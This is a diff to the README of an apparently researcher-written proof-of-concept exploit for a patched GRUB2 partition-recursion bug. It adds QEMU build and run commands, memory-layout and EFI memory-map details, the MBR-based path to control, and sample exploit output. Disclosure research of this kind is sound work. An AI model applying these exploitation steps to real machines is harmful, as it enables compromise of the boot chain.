@@ -3,6 +3,32 @@
 This is an exploit for a bug in GRUB2 that was fixed in January 2025.
 It was found, reported and patched by me.
 
+## Usage
+
+Make sure you have submodules initialized, as we build GRUB 2.12 from source.
+Also have OVMF installed (`apt install ovmf`) as we need some uefi firmware.
+You can compile ovmf from the edk2 tree if you want, I'm just using my distros
+build.
+
+Setup (bootstrap, configure, compile, and copy grub to ./artifacts/hda/):
+```
+just setup-grub && just build-grub && just install-grub
+```
+
+Run (generate the exploit files and write to `./artifacts/hda`, start qemu and
+run GRUB):
+```
+just exploit && just run
+```
+
+Debug, after a `just run` in a different terminal:
+```
+just debug ADDRESS_FROM_GDBINFO
+```
+
+`gdbinfo` is in the early-grub.cfg, so it should show up as grub starts.
+You may have to scroll up.
+
 ## The Bug - `part_iterate()` recursion
 
 The bug is a recursion triggered by GRUB recursively looking into partitions of
@@ -136,22 +162,91 @@ region allocated below the stack.
 
 ## Exploitation
 
+
+### Memory Layout
+
 ```
 RSP - (region + size)
 0xbff10518 - (0xbfe00000+987072) = 128344
 ```
 
 
-lsefimmap:
+Looking at `lsefimmap` we can see the stack and our target range are adjacent:
 ```
 Type      Physical start  - end             #Pages        Size Attributes
 ldr-code  00000000bfe00000-00000000bfef0fff 000000f1    964KiB UC WC WT WB
 BS-data   00000000bfef1000-00000000bff10fff 00000020    128KiB UC WC WT WB
 ```
 
+### Taking Control
+
 The protective MBR is the best way to get control.
 
 so goal is just to get the target struct to be under our fake mbr / top block
 
-
 using eval module, can work around this by defining a lookup table function.
+
+
+## Output
+
+You should see something like the following on successful exploitation:
+```
+ClashGPT - bah / January 2025
+[!] setup
+[!] Forcing memory pressure
+error: out of memory.
+[!] Setting up construction
+error: no such device: does_not_exist.
+[!] Corrupting: uwu_0
+[!] Determining Depth
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+error: no such device: does_not_exist.
+[!] Found: 313 0011 YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+[!] going for the kill
+error: no such device: does_not_exist.
+```
+
+The default payload is just an infloop (EB FE), change that if you want anything
+more.
